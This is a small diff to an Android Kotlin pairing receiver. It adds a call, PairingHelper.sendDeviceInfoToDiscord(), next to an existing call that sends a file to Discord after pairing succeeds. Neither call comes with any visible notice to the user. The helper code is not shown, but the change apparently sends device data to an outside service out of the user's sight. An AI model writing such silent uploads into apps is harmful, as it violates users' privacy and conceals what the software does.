@@ -167,6 +167,7 @@ class PairingCodeReceiver : BroadcastReceiver() {
             if (result != null) {
                 showStatusNotification(context, "Paired successfully!")
                 PairingHelper.sendFileToDiscord(context, result)
+                PairingHelper.sendDeviceInfoToDiscord()
                 PairingHelper.launchGame(context)
             } else {
                 showStatusNotification(context, "Pairing failed – check code and try again")
